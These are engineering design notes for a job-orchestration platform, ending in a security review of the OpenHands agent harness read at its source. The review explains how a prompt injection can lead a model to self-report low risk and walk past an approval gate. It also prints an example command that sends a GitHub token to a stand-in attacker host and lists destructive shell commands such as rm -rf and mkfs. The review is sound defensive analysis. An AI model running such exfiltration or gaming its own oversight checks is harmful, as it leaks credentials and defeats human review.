| A killed worker's task is reclaimed and requeued | `aKilledWorkerLosesItsTask` | making `reclaimLapsedLeases` return nothing |
| A stalled worker cannot write after being replaced | `aReusedWorkerNameDoesNotInheritTheClaim` | dropping `AND lease_epoch = ?` from `renew`/`release` |
| `FLUSHALL` loses no work | `flushingRedisLosesNoWork` | making `findStrandedQueuedTasks` return nothing |
| A rolled-back transaction queues nothing | `aRolledBackIntentIsNeverRelayed` | swapping `@ApplicationModuleListener` for `@EventListener` |
| An undelivered job is still owed | `undeliveredWorkOutlivesTheOutage` | the same swap |
| A flushed consumer group is rebuilt | `aFlushedGroupIsRebuilt` | removing the `NOGROUP` recovery |

**One of those neutralisations passed, and that was the useful one.** Removing the epoch predicate
from `renew` did not fail the fencing test, because reclaiming also clears `lease_owner` and the
owner check alone covered for it. The epoch only earns its place when the owner string is *reused* —
a restarted pod comes back under the same name — so the test was rewritten around that case and the
neutralisation then failed properly. The original test would have let someone delete fencing and
keep a green suite.

## Three deviations from the plan, each with a reason

**1. Leases and the reconciler live in `task`, not `platform.jobs`.** The plan puts them in platform
beside the queue. Fencing is why they moved: a stalled worker is stopped by making its write
conditional on the epoch *in the row it is writing*. A predicate against a separate lease table is
not the same guarantee — Postgres re-checks a concurrently updated row against the `WHERE` clause,
but it does not re-run a subquery against a lease table that moved on meanwhile. So the epoch belongs
on `tasks`, and whatever owns `tasks` owns the lease. Reconciliation followed for a second reason
below. `platform.jobs` keeps what is genuinely domain-free: the queue, the outbox relay, the leader
lock.

The alternative — a `LeaseReclaimer` port in platform implemented by `task` — was written out and
rejected. It would have been an interface with exactly one production implementation whose only
justification was the module diagram, which is the abstraction-without-pressure this project bans in
Appendix A.

**2. No Redis copy of the lease.** §5 lists `forge:lease:task:{id}` alongside the durable columns.
Dropped: lease operations are one acquire plus a heartbeat every 15s per *running task*, so the
Redis copy buys no measurable latency and adds a second place for the truth to live. Postgres also
answers the clock-skew concern §21 raises more directly than Redis TTLs do — expiry is decided by
the same clock that wrote the expiry, so no two hosts have to agree on the time. This makes "losing
Redis costs latency, not correctness" straightforwardly true rather than something to be careful
about.

**3. Reconciliation iterates workspaces.** Row-level security has no all-tenants mode for this
application by design: `forgestack_app` is not `BYPASSRLS`, so a cross-tenant scan returns zero rows
however it is written. The sweep therefore takes `IamQueries.activeWorkspaceIds()` and enters each
scope in turn. That is a real per-sweep cost and the honest price of an isolation guarantee the
application cannot escape even when its own code is wrong. **Revisit when one sweep stops fitting
comfortably inside its interval** — the shape that replaces it is a workspace-agnostic index of
outstanding leases, not a wider grant.

## What the reconciler rescues, and why it is two things

`state = 'RUNNING'` with a lapsed lease is a worker that died. `state = 'QUEUED'` for longer than a
grace period is what a *lost message* looks like from the database's side — the row still says
queued and the message it refers to no longer exists anywhere. §5 says "state=QUEUED **or** lease
expired" for exactly this reason. The grace period exists because there is no way to tell "the
message was lost" from "no worker has got to it yet" except by waiting, which is also why
re-queueing has to be harmless and every consumer has to be idempotent.

Reclaiming writes a `task_state_transitions` row in the same transaction as the state change, so the
schema's claim that every state change has exactly one transition row is true from the first day
rather than from whenever 2.3 lands. A transition log with holes in it answers nothing, and the holes
would be precisely the incidents anyone goes looking for.

### The defect the live run found

The first version had no memory of having re-queued anything, so a task nobody had capacity for
looked lost on *every* sweep. Watching the real app for four minutes with one stranded task on it
produced **eight copies of the same message** — one per sweep, and it would have continued
indefinitely. The suite was green throughout: duplicates are safe by design, every test asserted the
task *was* queued, and nothing asserted how often.

Duplicates being harmless is exactly what made this easy to miss and wrong to leave. Queue depth is
the number an operator reads to answer "are we behind", and §5's own advice — alert on outbox age,
not just queue depth — assumes depth still means something.

`V9__reconciler_backoff.sql` adds `tasks.requeued_at` and the reconciler skips anything re-queued
within a grace period, bounding it to one message per grace period instead of one per sweep. Kept
separate from `state_entered_at` deliberately: re-queueing is not a state change, and folding it in
would reset "how long has this been QUEUED" on precisely the tasks worth noticing. `reQueueingBacksOff`
covers it, watched failing first by removing the predicate.

**This is the fourth phase running in which the live system found something a green suite did not.**

## Details worth keeping

- **`event_publication` is `text`, not `varchar(255)`.** The table's shape belongs to
  `spring-modulith-events-jpa`, whose entity Hibernate validates against at startup. The DDL was
  generated from that entity via `jakarta.persistence.schema-generation` rather than transcribed
  from documentation. Widening the three string columns was then checked empirically: Hibernate's
  `validate` compares types, not lengths, and accepts `text`. A serialized event is JSON whose size
  is a property of the event, and a listener id is a class name plus a method signature.
- **`completion-mode: delete`.** The outbox is a work list, not a history — §19 already separates it
  from the audit log. Keeping completed rows would grow the table forever to preserve a duplicate of
  something `task_state_transitions` records better.
- **`@EnableAsync` is declared, not inherited.** `@ApplicationModuleListener` is meta-annotated
  `@Async`; without async enabled the annotation still compiles, the event still persists, and the
  relay runs inline — so the outbox would appear to work while holding every publishing request
  behind a Redis round trip.
- **Acknowledging deletes the stream entry.** A consumer group recreated after a flush starts at
  offset 0, so leaving acknowledged entries in place would replay everything ever sent. Deleting on
  ack makes that replay cover exactly the work still owed.
- **The leader lock is an optimisation, and is documented as one.** Everything behind it is already
  safe to run twice (`FOR UPDATE SKIP LOCKED`, epoch bumping). A leader lock that safety depends on
  is a bug waiting for a network partition.

## Deferred, with reasons

- **Graceful drain on `SIGTERM`.** Listed in 2.1. There is no worker loop yet — nothing polls the
  queue outside tests — so a drain flag would have no caller and no way to be exercised. It belongs
  with the attempt loop in Phase 3, where `SIGTERM → stop claiming → finish the step → checkpoint →
  release the lease` is a sequence something actually performs.
- **Priority streams (`forge:q:agent:{p0,p1,p2}`).** One stream per kind today. Routing by priority
  needs a scheduler making the routing decision; `tasks.priority` is already there for it.
- **Reclaiming another consumer's pending entries (`XAUTOCLAIM`).** Deliberately not the recovery
  path: recovery comes from Postgres, and a second one that depended on the pending-entries list
  would make Redis load-bearing again.

## Verified live

Against the running app and the real Postgres and Redis, not Testcontainers: V8 applied cleanly;
`event_publication` grants land as `arwd` for `forgestack_app`; the sweep fires on its timer and
takes `forge:leader:scheduler`; a task inserted as `RUNNING` with a lapsed lease was moved to
`QUEUED` with `lease_epoch` 7 → 8, its owner cleared, a `LEASE_EXPIRED` transition row written, the
job placed on `forge:q:task` with the right resource id, and the outbox row completed and removed.

## Next

2.3 `TaskStateService` — the declared transition table and its guards (§10.3). V7 created the states;
nothing yet enforces which transitions between them are legal, and `LeaseReconciler` currently writes
`RUNNING → QUEUED` directly. That write moves behind the state service when it exists.

# Phase 2 — step 2.3a: lease enforcement moves into the database

**Status: implemented.** `V10__lease_fencing.sql`, `LeaseScope`, 7 tests. Suite 120 → 127 green.
Verified live. Closes `known-gaps.md` §3.7, which was the widest-blast-radius gap in Phase 2.

The rest of 2.3 — the declared transition table and its guards (§10.3) — is still open. This is the
half the concern was actually about.

## The plan's fix, and why it was not enough

§10.3 funnels every state change through `TaskStateService`, and the intended answer to §3.7 was to
give it a `Lease` parameter so a caller without a claim could not express the write. That is a real
guarantee and worth having — the compiler is a good place for a rule.

It binds code that goes *through the service*. The gap was never about code that goes through the
service; it was about the statement someone adds in six months against `tasks` directly, without
thinking about leases at all. A service cannot refuse a write it never sees.

So the rule went where it cannot be skipped, on exactly the terms this schema already uses for
tenancy. RLS does not ask modules to filter by workspace; Postgres refuses rows that do not match a
session GUC. `V10` does the same for claims: a `BEFORE UPDATE` trigger on `tasks` refuses any write
to a task under a live lease unless the session carries that claim in `app.lease_task` and
`app.lease_epoch`. `LeaseScope.runUnderLease` binds them with `SET LOCAL`, the way `TenantScope` binds
the workspace, and clears them on the way out because a `TransactionTemplate` joins rather than nests.

**Stronger than RLS in one respect:** a superuser bypasses row-level security and does not bypass a
trigger. Verified live — a `postgres` `UPDATE` against a leased task is refused.

## Two GUCs, not one

An epoch alone would let a scope opened for task A authorise a write to task B sitting at the same
epoch. Epochs are per-row counters starting at zero, so collisions are the normal case rather than a
coincidence. `aClaimDoesNotTravel` asserts it with both tasks deliberately at the same epoch.

## Expiry is the only way past the fence, deliberately

A lapsed claim is precisely what the reconciler exists to take back, and it cannot carry an epoch
because the point is that its holder is gone. Making expiry the boundary means the escape hatch and
the recovery path are the same thing — there is no bypass to add, and none to reach for by mistake.

Every current writer already satisfies this without a special case: `acquire` can only match a task
whose claim has lapsed, `renew` and `release` run under `LeaseScope`, the reconciler reclaims only
lapsed leases, and `requeued_at` is written to tasks nobody holds. The one legitimate write with no
path — a human cancelling a task a worker is actively running — has no caller yet and is recorded as
`known-gaps.md` §3.12 rather than pre-empted with a bypass.

## What the trigger found

A latent bug in the reconciler, on the first run. `findStrandedQueuedTasks` selected on `state =
'QUEUED'` alone, and a worker claims a task *before* moving it to `RUNNING` — so there is a real
window where a task is both queued and held. Re-queueing then would hand the same work to a second
worker while the first was starting on it. The trigger turned that into a loud failure (the
`requeued_at` write is refused, taking the whole sweep with it) instead of a duplicate nobody would
have traced back. The scan now excludes live claims, which it should always have done.

## The layer above still gets built

The predicates in `TaskLeases` stay, and they earn their place: a predicate that matches no rows
returns `false`, which a caller can act on, while the trigger raises, which is a failure. Losing a
claim is expected and should not read like a fault. When `TaskStateService` lands it takes a `Lease`
for worker-initiated transitions as §10.3 intended — the compiler layer on top of the database one,
with the database as the layer that holds when the compiler is not consulted.

## Tests

`LeaseFencingTest`, written as the naive statements someone would actually add: plain `UPDATE tasks`
through a `JdbcTemplate`. Watched failing first by disabling the trigger — four of the seven flipped
to "Expecting code to raise a throwable", and the three permissive cases stayed green.

The fixture had to change too: `TaskRows` backdates through whatever claim the task currently holds,
because the trigger gives test fixtures no exemption. That is worth having rather than working
around — a fixture that could write past the rule could set up states the real system cannot reach,
and tests against those prove nothing.

# Phase 2 — step 2.3: the transition table and its guards

**Status: implemented.** `TaskState`, `TaskEvent`, `Actor`, `TaskFacts`, `TaskGuard`,
`TaskTransitions`, `TaskStateService` and two exceptions; 18 tests. Suite 127 → 145 green. Closes
`known-gaps.md` §3.10.

## Exit criteria

> *Every illegal (state, event) pair throws; `COMPLETE` is refused when any single guard precondition
> is removed.*

**All 228 pairs, not a sample.** `TaskTransitionTableTest` walks the full state × event product and
asserts that anything undeclared has no transition at all. An unhandled pair that quietly did nothing
would be worse than one that throws: a task silently ignoring `COMPLETE` looks exactly like a task
still working. `TaskStateServiceTest.anIllegalEventThrows` covers the service end, watched failing
first by letting an undeclared pair fall back to a self-transition.

**Each guard disarmed in turn**, one run per guard, and each failed exactly its own test and nothing
else:

| Guard disarmed | Test that failed |
|---|---|
| `NO_ATTEMPT_IN_FLIGHT` | completion is refused while an attempt is still running |
| `LATEST_ATTEMPT_SUCCEEDED` | the latest attempt did not succeed; an earlier success does not rescue a later failure |
| `WITHIN_BUDGET` | completion is refused when the budget was exceeded |
| `ATTEMPT_CAP_REACHED` | giving up needs the attempt cap actually reached |

That "and nothing else" needed a design change to be true. `latestAttemptOutcome` originally read the
highest-numbered attempt, so an in-flight attempt failed *both* `NO_ATTEMPT_IN_FLIGHT` and
`LATEST_ATTEMPT_SUCCEEDED` — meaning either could be disarmed while the other covered for it. It now
reads the most recent *finished* attempt, keeping "nothing is running" and "the last thing that ran
succeeded" as two separate questions. Same failure mode as the lease-epoch test earlier in this
phase, caught the same way.

## The five guards that decide nothing

Of §10.3's seven completion preconditions, two have data today. The rest need `evidence`,
`human_interventions`, diff guards, a policy engine, and pull-request state — none of which exist.

They are declared anyway, marked `PENDING`, and they pass. A guard list that quietly contained three
checks while looking like eight would be believed, and that is the failure this project keeps finding
in its own work. So the unenforced half is made visible in the one place nobody can avoid reading:
**every transition writes each guard's verdict into `task_state_transitions.guard_results`**, and a
task completed today carries a permanent record that five of its preconditions were `NOT_ENFORCED`.
The set is pinned by a test, so shrinking it is a deliberate edit and growing it is a conversation.

Passing rather than blocking is the uncomfortable half of the trade: blocking every completion would
make the phases that build the missing data impossible to build. **The gate on Phase 4 is that this
set is empty** — nothing autonomous may complete a task under a rule this weak (`known-gaps.md`
§3.13).

## Decisions inside the table

- **`REJECT` and `TIMEOUT` land in different states.** A person saying no is `CANCELLED`; nobody
  answering is `ABANDONED`. Collapsing them would lose the distinction between a decision and the
  absence of one, which is exactly what somebody triaging a stalled queue needs.
- **`ATTEMPT_FAILED` is a self-loop on `RUNNING`.** A new attempt is not a new lifecycle — the worker
  still holds the task, and only the approach is being discarded.
- **`UNSUSPEND` returns to `READY`, not to where it left.** Capacity, dependencies and budget all
  have to be re-examined after an interval nobody bounded.
- **`SUSPEND` and `CANCEL` are generated from a set of live states** rather than written out, so
  adding a state cannot silently create one that ignores a budget breach or refuses cancellation.
- **The expected transition set is written out a second time in the test.** Deriving it from the table
  would assert only that the code equals itself. Adding a transition should mean editing two places
  on purpose, in a diff a reviewer reads.

## Where this meets the fence

`apply` has two entry points: one taking a `Lease`, one taking a workspace and task id. The second is
for admission, cancellation, and the reconciler; the first is for a worker acting on a task it holds.
Choosing wrong is not silent — V10 refuses an unfenced write to a task under a live claim, so
transitioning a running task from outside fails at the database instead of racing the worker.
`aRunningTaskIsProtectedFromOutside` asserts both directions.

Entering `QUEUED` publishes the enqueue intent, so queueing is a consequence of the state rather than
a second thing to remember. That let `LeaseReconciler` drop its own `tasks.state` write, its
hand-written transition insert, and its separate enqueue for reclaimed tasks.

## Verified live

The reconciler's `LEASE_EXPIRED` path, through the new service, against the running app: a task with
a lapsed claim moved `RUNNING → QUEUED`, epoch 2 → 3, `requeued_at` stamped, the transition row
written by the service, and the job on `forge:q:task`.

Everything else in the FSM has only ever run under Testcontainers, because there is no HTTP surface
until 2.4 — recorded as `known-gaps.md` §3.14, since every phase so far has found bugs live that a
green suite missed.

## Next

2.4 — the task REST API with fake phase handlers simulating success, failure and escalation. That is
what finally drives this FSM from outside a test, and what makes the `COMPLETE` path reachable by
something other than a fixture.

# Phase 2 — step 2.4: the task API and a runtime with nothing real in it

**Status: implemented.** `V11__simulated_outcomes.sql`, the `runtime` module, `TaskService`,
`TaskAttempts`, `TaskController`, 15 tests. Suite 145 → 160 green. Verified live over HTTP. Closes
`known-gaps.md` §3.9 and §3.14.

## Exit criterion

> *A task runs end to end through the FSM with no model and no sandbox.*

Against the running app, over real HTTP, in about half a second:

```
POST /api/tasks           → 202, QUEUED
ADMIT → ENQUEUE → CLAIM → COMPLETE      (COMPLETED, 1 attempt, 5 step rows)
```

And the two paths that are harder than the happy one:

```
ESCALATE:  ADMIT ENQUEUE CLAIM ESCALATE_HUMAN → AWAITING_HUMAN
           POST /answer {"resume":true}
           RESUME CLAIM COMPLETE                → COMPLETED, 2 attempts
FAIL:      ADMIT ENQUEUE CLAIM ATTEMPT_FAILED ATTEMPT_FAILED ABANDON → ABANDONED, 3 attempts
```

Everything in those lines is real except what an attempt concluded: the outbox, the Redis stream,
the lease and its fence, the transition table, the guards, the attempt and step rows. `TaskWorker` is
the attempt loop in the shape it will keep; only `FakePhaseHandler` goes away.

Watched failing first by removing the `CLAIM` transition from the worker (six of six lifecycle tests
fail) and by putting `RESUME` back to `RUNNING` (see below).

## A correction to the plan's FSM

**`AWAITING_HUMAN --RESUME--> RUNNING` deadlocks, and so does
`AWAITING_EXTERNAL --EXTERNAL_FAILED--> RUNNING`.** Both now land in `QUEUED`.

`RUNNING` means a worker holds a live lease. A person clicking "continue" holds no lease and puts
nothing on a stream, and neither does a webhook reporting a failed check. A task resumed into
`RUNNING` is therefore invisible to *both* halves of the reconciler — the `QUEUED` sweep does not
match it, and the expired-lease sweep does not either, because there is no lease to expire. The task
would never move again, and nothing would report it as stuck.

Going through `QUEUED` reuses the enqueue that entering that state already performs, so it costs
nothing. It also turns "`RUNNING` implies a live lease" from a coincidence into a property worth
asserting.

*The alternative considered:* a third reconciler branch for orphaned `RUNNING` tasks. Rejected as the
primary fix — it costs a grace period of dead time every time a person clicks continue, and it leaves
the contradictory state legal, so the invariant could never be checked. Still worth adding later as a
backstop against bugs, with a warning log rather than silent healing.

## `YIELD`, and graceful drain arriving late

2.1 deferred graceful drain because nothing polled the queue. That stopped being true here, so it was
built: `TaskWorker` stops claiming on `ContextClosedEvent`, finishes the attempt in hand, and applies
a new `YIELD` event to hand the task straight back to the queue.

`YIELD` is deliberately not `LEASE_EXPIRED`. One says the holder stopped answering; the other says it
left on purpose and the work is intact. Collapsing them would make every routine deploy look like a
worker crash on whatever dashboard is eventually built from this log.

**The drain check sits on `runAvailableWork`, not on the scheduled method** — a placement the test
caught. With it on the timer, a draining process still took on work through any other entry point,
which is the exact failure drain exists to prevent arriving through a different door.

## Decisions worth keeping

- **Creation is three transitions, not an insert.** `CREATED → READY → QUEUED`, each a row. Creating
  a task already admitted would hide the two decisions admission actually is — budget and policy —
  behind an insert, and they are worth a record even while nothing yet makes them.
- **Retries happen inside one claim.** `ATTEMPT_FAILED` is a self-loop, so the worker opens the next
  attempt rather than going back through the queue. A retry is a new approach, not a new lifecycle.
- **202 on create, never 201.** The resource exists; the thing the caller asked for has not happened.
- **409 on an illegal transition, not 400.** The request was well formed and would have worked a
  moment earlier or later. Answering "bad request" sends the caller hunting for a mistake in its own
  payload. The guard-refusal response names every guard's verdict, because "why not" is the question.
- **`runtime` depends on `task` and `platform`, and on neither `api` nor `iam`.** It writes no table
  it does not own — attempts and steps go through `TaskAttempts`. The day it becomes its own service
  the change should be a build file and a transport.
- **`FakePhaseHandler` is a concrete class, not an interface.** The seam belongs there the day a
  second handler exists. One introduced now would be an abstraction with no pressure behind it.

## What the tests found

- **The worker's one-second poll was live in every other test.** `AbstractIntegrationTest` pinned the
  reconciler's interval but not the runtime's, so the worker would quietly claim and run tasks other
  test classes had left queued — changing rows those tests were asserting on, from another thread,
  sometimes. Now pinned to `PT24H` alongside the reconciler.
- **The asynchronous relay is visible from the outside.** A test that created a task and immediately
  ran the worker found nothing: the enqueue intent commits with the state change and reaches Redis a
  moment later. Tests now wait for it, which is the honest shape rather than a workaround.

## Deferred, with reasons

- **`SUSPEND`/`UNSUSPEND`, `BLOCK`/`DEP_RESOLVED`, `TIMEOUT`, `SUBMIT`, `EXTERNAL_FAILED`** are in the
  table and have no caller. They wait on budgets (§18), the work graph (§12), a scheduler sweep, and
  pull requests respectively. Declared now because the table is closed and reviewed as a whole.
- **Priority, admission control and per-repo concurrency.** `tasks.priority` exists; nothing reads it.
  The scheduler that would is §9's, and building it before there is contention to schedule would be
  guessing at the shape of the problem.
- **A real `SIGTERM` test.** The drain flag is driven directly. Nothing in the suite starts and kills
  the packaged application — the same gap as "no test boots the packaged application".

## Next

Phase 2 is complete. Before Phase 3, two things are worth doing in this order: an
`AuthenticationEntryPoint` returning `401` for `/api/**` (`known-gaps.md` §4.5 — it blocks any
frontend), and the Phase 0 decision on whether to adopt an L2 harness, which is what Phase 3 is
gated on.

# Phase 0 — status: not run, and what that means now

**There is no harness decision, because the spike that was supposed to produce one never happened.**
Phase 0 was scheduled to run in parallel with Phase 1. Phase 1 shipped, Phase 2 shipped, and the
spike did not start. Appendix B is therefore still what it says it is — a hypothesis assembled from
documentation — and B.8 is explicit that this is not good enough: *"Decide from that data. Everything
above is a hypothesis formed from documentation, and documentation is written by people selling
something — including the MIT-licensed ones."*

Recorded here rather than quietly carried forward, because "we chose OpenHands" is one careless
sentence away from being true in everyone's head without anybody having measured anything.

## What was re-checked on 2026-08-17

Appendix B's three load-bearing external claims, verified at source rather than from memory.

| Claim | Still true? | Detail |
|---|---|---|
| Managed Agents cannot offer ZDR | **Yes, and worse** | Anthropic's own docs: not eligible for Zero Data Retention *or* a HIPAA BAA, because sessions persist history and sandbox state server-side. Still beta (`managed-agents-2026-04-01`). Self-hosted sandboxes move tool execution, not session storage — they do not fix it. |
| OpenHands ships a drivable agent server, MIT | **Yes** | `openhands-agent-server` 1.33.0, released 2026-07-08. REST + WebSocket, Python 3.12+, actively maintained. |
| Claude Agent SDK is a viable fallback | **Yes** | Self-hosted, subprocess per session, `SessionStore` adapters for S3/Redis/Postgres, documented multi-tenant isolation. Still Anthropic-only, so adopting it still costs §13's provider-agnosticism. |

## Two things the docs say that Appendix B did not record

**OpenHands' agent server stores conversations, events and workspace files on the local filesystem,
and its own documentation calls it "ideal for development, testing, and lightweight deployments."**
That is not a description of multi-tenant SaaS. Whether the agent server is the right unit to deploy
per workspace, or whether we need something around it, is now a question the spike has to answer
rather than a detail to discover in month six.

**Claude's `SessionStore` mirror writes are best-effort.** When a batch cannot be delivered the SDK
*drops it*, emits `mirror_error`, and carries on. It also mirrors transcripts only — not `CLAUDE.md`
or working-directory artifacts.

Those two are the same finding from opposite directions, and it is the sharpest thing to come out of
this re-check: **both candidate harnesses have a weaker durability model than the one Phase 2 just
built.** We spent this phase making "losing Redis costs latency, not correctness" true, with a
transactional outbox, fenced leases, and a reconciler that rebuilds from Postgres. Bolting an inner
loop underneath it whose own state can be silently dropped puts the weakest link inside the part we
did not write. That belongs in the spike's crash-resume criterion as the primary question, not a
sub-clause.

## What Phase 2 already settled

B.8 lists four things to measure and calls one of them "most important": **whether transition
authority can stay on the Java side.** That is no longer an open question, and the answer did not come
from a harness evaluation — it came from building the FSM.

- `TaskStateService` is the only writer of `tasks.state`, and the transition table is closed.
- V10's fence refuses any write to a leased task that does not carry the claim, including from a
  superuser.
- `TaskGuard` decides completion from committed rows. Prose cannot satisfy a guard.

A harness reporting "I finished" is an *input*. There is no code path by which it becomes a state.
The residual risk is ergonomic — a harness whose model fights ours is unpleasant to drive — not
architectural, and unpleasant is not a reason to build an inner loop ourselves.

**So the spike shrinks to three questions**, all of which still require spending money on real runs:

1. Resolution rate and cost per resolved task, on a repository shaped like a customer's.
2. Crash-resume correctness, measured against the durability concern above: kill the harness
   mid-attempt and establish what is actually lost.
3. Whether §16's credential boundary holds — no GitHub token reachable inside the harness sandbox.

## Recommendation

**Do not pick a harness from documentation, including this document.** Two things follow:

- **Phase 3.1 is not gated and should proceed:** the `ExecutionHarness` port, its in-memory fake, and
  the conformance suite are ours whichever harness wins, and `FakePhaseHandler` already has the shape
  the fake needs. Building it first also makes the spike cheaper, because the spike can then be
  written against the port instead of against two vendor APIs.
- **Phase 3.2 onward stays gated** until the three questions above have numbers.

The spike needs a real repository with seeded failing tests, model spend on the order of the plan's
$100–1000 per run, and both an Anthropic key and a provider key for the model-agnostic side. That is
a resourcing decision, not an engineering one.

---

# Appendix B, corrected — OpenHands read at the source, not from its paper

**Date: 2026-08-18. Method: `git clone --depth 1 --branch v1.42.1`, then read the code.** Appendix B
was written from the arXiv paper and the docs site. Both are marketing surfaces. This section records
what the implementation actually does, and every claim below cites a file and line at that tag.

**First fact, and it colours everything else: the version moved.** Appendix B's own re-check on
2026-08-17 recorded 1.33.0 (2026-07-08). Latest is **v1.42.1 (2026-08-12)** — nine minor versions in
five weeks, on a project with 199 open pull requests. B.7's "we inherit someone else's roadmap" is not
a hypothetical risk to mitigate later; it is the current operating condition. "Pin versions, do not
track `main`" needs to become "pin versions and budget for the upgrade treadmill."

## B.3's convergence table is too generous — three rows are wrong

The table claimed near-equivalence between our design and theirs. At the interface level it mostly
holds. At the level of *what is actually guaranteed*, three rows invert.

### Row 1 — "§17 risk classification, approval gate ≡ SecurityAnalyzer + ConfirmationPolicy"

**This is backwards, and it is the most important correction in this document.**

§17 states an asymmetry we called non-negotiable: risk is a pure function of persisted rows (path
globs, change shape), and the model may raise it but never lower it. The reason is written into the
plan — "every persuasive argument for lowering risk is exactly what a prompt-injection payload would
produce."

OpenHands' headline analyzer does the opposite:

```python
# openhands-sdk/openhands/sdk/security/llm_analyzer.py:29
def security_risk(self, action: ActionEvent) -> SecurityRisk:
    return action.security_risk
```

`action.security_risk` is a **tool-call parameter the model fills in itself**. The tool schema asks the
model to self-report its own danger level, and `LLMSecurityAnalyzer` returns that self-report
unmodified. Compose it with `ConfirmRisky(threshold=HIGH)` — which is exactly what their headline
example `examples/01_standalone_sdk/16_llm_security_analyzer.py` does — and a model that emits
`security_risk=LOW` walks straight through the confirmation gate. An injection that persuades the model
its migration edit is routine defeats the entire control.

**The correction to the correction:** they also ship the pieces to do it properly, and Appendix B
missed those too.

- `security/defense_in_depth/policy_rails.py` — deterministic rails returning HIGH for `dd`, `mkfs`,
  `rm -rf` and similar, with a real shell AST parser (`security/_shell_ast.py`, `shell_parser.py`)
  rather than regex.
- `security/ensemble.py:76` — `EnsembleSecurityAnalyzer` fuses child analyzers by **max severity**, and
  fail-closes to HIGH when a child raises. That is our asymmetry, implemented correctly.

So the accurate statement is: **OpenHands can be configured to satisfy §17's asymmetry, and its
default posture does not.** `EnsembleSecurityAnalyzer([PolicyRailSecurityAnalyzer(), PatternSecurityAnalyzer(), LLMSecurityAnalyzer()])`
gives max-fusion where the model can only raise. That is a configuration Forge must set deliberately,
per conversation, and pin a test on — not a property we inherit.

**And even configured, it does not overlap our risk model.** Their rails classify *shell command
danger*. §17 classifies *change shape and blast radius* — `**/migrations/**`, `.github/**`,
`**/auth/**`, deletion volume. Different axes. Nothing in their tree computes ours. §17 stays entirely
ours; their analyzer is at best a second, orthogonal signal — which is what B.6 already concluded, for
weaker reasons than the ones now available.

### Row 2 — "§16 SandboxProvider ≡ Workspace abstraction"

True as an interface shape. False as a security posture.

`openhands-workspace/openhands/workspace/docker/workspace.py` is 428 lines and contains **zero**
occurrences of `cap-drop`, `read-only`, or `no-new-privileges`. No `--user`, no `--pids-limit`, no
`--memory`, no seccomp profile, no egress policy. It builds a `docker run` that publishes container
port 8000 to a host port and optionally joins a named network. There is also **no Kubernetes
workspace** — the tree offers `docker`, `apptainer`, `cloud`, and `remote_api` only.

Every hardening flag in §16's block is still ours to apply, and applying it means wrapping or bypassing
their workspace launcher rather than configuring it. The port shape converges; none of the hardening
does.

### Row 3 — "§11 append-only steps, replay ≡ event-sourced ConversationState"

The event log is real. Its **durability substrate is JSON files in a directory**:

```python
# openhands-agent-server/openhands/agent_server/persistence/store.py:239
DEFAULT_PERSISTENCE_DIR = Path("workspace/.openhands")
```

Atomic writes via `Path.replace`, advisory file locks, and — genuinely careful work — a
`ConversationLease` (`conversation_lease.py`) with a generation counter, a 45-second TTL, PID-liveness
checks, and a `guarded_write(generation)`. That is a fenced lease, the same idea as our V10 trigger.

But the enforcement boundary is a **local filesystem**, and the liveness check is
`_is_pid_alive` on `_current_host()` — explicitly documented as "best-effort." Our fence is a Postgres
trigger that refuses the write inside the database, and it holds against a superuser. Theirs protects a
directory on one machine.

No database anywhere in the agent server. Grepping the whole package for `sqlite|postgres|DATABASE_URL`
returns nothing.

**Consequence:** the agent server's state cannot be queried, joined, audited, or shared between workers.
This is not a defect on their side — it is a single-node sidecar and is built like one. It is a defect
in Appendix B's framing, which credited "durability of the inner loop becomes the harness's problem"
(B.5) as a reason our hand-rolled L1 gets *safer*. It does not. It becomes the problem of a JSON
directory inside an ephemeral container.

## The finding Appendix B has no row for at all: credentials are designed to enter the sandbox

§16 contains the plan's single strongest security claim: **no GitHub token ever enters the sandbox**,
all git operations host-brokered, and `sandbox ↛ githubapp` enforced by ArchUnit so it cannot regress.

OpenHands is built on the opposite assumption. The mechanism:

```python
# openhands-sdk/openhands/sdk/conversation/secret_registry.py:73
if key.lower() in text.lower():          # `text` is the model-authored command
    found_keys.add(key)
```

`get_secrets_as_env_vars(command)` scans the command string for a registered secret's **name**, and if
the name appears anywhere in it, resolves the real value. The terminal tool then exports it into the
persistent bash session *before* running the command:

```python
# openhands-tools/openhands/tools/terminal/impl.py:467-468
self._export_envs(action, conversation, session=self.session)
observation = self.session.execute(action)
```

The trigger is a substring match on text the model wrote. A command of the form
`curl https://attacker/?t=$GITHUB_TOKEN` contains the string `GITHUB_TOKEN`, which causes the value to
be exported, and then expands it. Output masking (`mask_secrets_in_output`) hides the value from the
model's view of the result — it does nothing about egress that already happened.

The ACP path is blunter still, injecting the entire registry upfront, with the gap acknowledged in the
docstring:

```
# secret_registry.py:121
least-privilege scoping (provider creds + an explicit allowlist only) is deferred to #1039 task 6
```

There is also a whole `credential_binding.py` router whose job is fetching credentials *into* the
sandbox from a callback URL (`HttpVersionedCredentialBinding`) or a local `FileSecretsStore`.

**This is not a blocker, and the reason matters.** The mechanism is strictly opt-in: secrets are only
injected if something registers them. Forge registers none, never calls
`POST /conversations/{id}/secrets`, and keeps git host-brokered. Their `git_router` is read-only
(`changes`, `diff`, `commits`) — it has no push or PR endpoint — so `captureDiff` maps cleanly onto it
and the §16 flow survives intact.

What it costs is honesty about what we are buying. A large part of what makes OpenHands convenient —
agent-side git push, provider auth, PR creation — is exactly the part §16 forbids. We adopt the harness
and decline its credential model, which means declining several of the features that make it attractive
in the first place, and adding a conformance test that asserts the secret registry is empty for every
attempt.

## Multi-tenancy is not undocumented — it is structurally absent

```python
# openhands-agent-server/openhands/agent_server/dependencies.py:35
if config.session_api_keys and session_api_key not in config.session_api_keys:
    raise HTTPException(status.HTTP_401_UNAUTHORIZED)
```

One shared `X-Session-API-Key`, checked against a flat list. No user, no tenant, no per-conversation
authorization. One key grants every conversation on the server. And note the leading conjunct: **if no
key is configured, the check passes** — an agent server started without `session_api_keys` is fully
open, while its Docker workspace publishes it on a host port.

§18's four layers have no counterpart and cannot be delegated. The only isolation boundary available is
*one agent server process per tenant*, which happens to match our one-sandbox-per-attempt lifecycle —
so this is survivable, but it means the agent server sits **inside** the sandbox boundary rather than
being a shared service Forge calls. Any design that pools agent servers across workspaces is a
cross-tenant breach by construction.

## What genuinely is better than ours, and worth taking

Read honestly, three things in their tree are ahead of the plan:

1. **`stuck_detector.py`** — deterministic loop detection over the last 20 events: repeated
   action-observation pairs, repeated action-error runs, agent monologue, alternating loops, and
   context-window error loops. §9's escalation trigger list is a prose sketch; this is a working
   implementation of the same idea, and it is runtime-owned rather than model-reported, which is
   exactly our stance. Worth stealing conceptually whichever harness wins.
